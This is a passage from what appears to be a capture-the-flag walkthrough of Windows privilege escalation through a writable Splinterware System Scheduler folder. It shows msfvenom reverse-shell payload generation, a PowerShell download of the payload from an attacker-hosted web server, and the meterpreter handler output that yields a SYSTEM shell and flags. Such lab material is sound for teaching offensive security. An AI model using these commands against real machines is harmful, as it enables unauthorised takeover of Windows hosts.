Splinterware System Scheduler Professional 5.30 - Privilege E | windows/local/49858.txt
-------------------------------------------------------------- ---------------------------------{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the `acl` and service status for `SystemScheduler`.
{% capture code %}{% raw %}meterpreter> shell
C:\Program Files (x86)\SystemScheduler>icacls "c:\Program Files (x86)\SystemScheduler"
icacls "c:\Program Files (x86)\SystemScheduler"
c:\Program Files (x86)\SystemScheduler Everyone:(OI)(CI)(M)
                                    NT SERVICE\TrustedInstaller:(I)(F)
                                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                    BUILTIN\Administrators:(I)(F)
                                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                    BUILTIN\Users:(I)(RX)
                                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\SystemScheduler>sc qc WindowsScheduler
sc qc WindowsScheduler
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: WindowsScheduler
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 0   IGNORE
            BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : System Scheduler Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the logs in the target machine from the path `c:\Program Files (x86)\SystemScheduler`. There will be a scheduled task which invokes `Message.exe` file. This can be exploited and replaced with `reverse shell` payload, since the path is writable and has `system` context.

Create a new `reverse shell` payload pointing to different port.
{% capture code %}{% raw %}msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<source-ip> LPORT=4444 -f exe -o Message.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: Message.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `python web server` to download the `reverse shell` payload.
{% capture code %}{% raw %}python -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...{% endraw %}{% endcapture %} {% include code.html code=code %}

From the `meterpreter` shell in `msfconsole -q`, download the payload and exit the shell.
{% capture code %}{% raw %}meterpreter> shell
C:\Program Files (x86)\SystemScheduler> powershell -c wget "http://<source-ip>:8080/Message.exe" -outfile shell.exe
powershell -c wget "http://<source-ip>:8080/Message.exe" -outfile shell.exe

C:\Program Files (x86)\SystemScheduler>^C
Terminate channel 4? [y/N]  y
meterpreter > exit
[*] Shutting down Meterpreter...

[*] <target-ip> - Meterpreter session 1 closed.  Reason: User exit{% endraw %}{% endcapture %} {% include code.html code=code %}

From the `meterpreter` shell in `msfconsole -q`, set `LPORT` variable as per new `reverse shell` payload, retaining existing handler and other variables, and exploit to get the flags.
{% capture code %}{% raw %}msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on <source-ip>:4444
[*] Sending stage (176195 bytes) to <target-ip>
[*] Meterpreter session 2 opened (<source-ip>:4444 -> <target-ip>:49332) at 2021-05-02 06:24:01 +0100

meterpreter > shell
Process 812 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>cd C:\Users\jeff\Desktop
cd C:\Users\jeff\Desktop

c:\Users\jeff\Desktop>type user.txt
type user.txt
<flag>

c:\Users\jeff\Desktop>cd ../../Administrator/Desktop
cd C:\Users\jeff\Desktop

c:\Users\Administrator\Desktop>type root.txt
type root.txt
<flag>{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 5 - Privilege Escalation Without Metasploit

The same tasks for gaining `reverse shell` and `privilege shell` can be done without `meterpreter`.

When the initial `netcat` listener connection was established, `python web shell` can be created and `winPEAS` scripts can be dowloaded to `C:\Windows\Temp`, which is world writable. Exploits can be found using `winPEASx64.exe` or `winPEAS.bat` and `reverse shell` payloads can be generated as earlier. Once the `Message.exe` is replaced with `reverse shell` payload for `privilege escalation`, flags can be obtained.

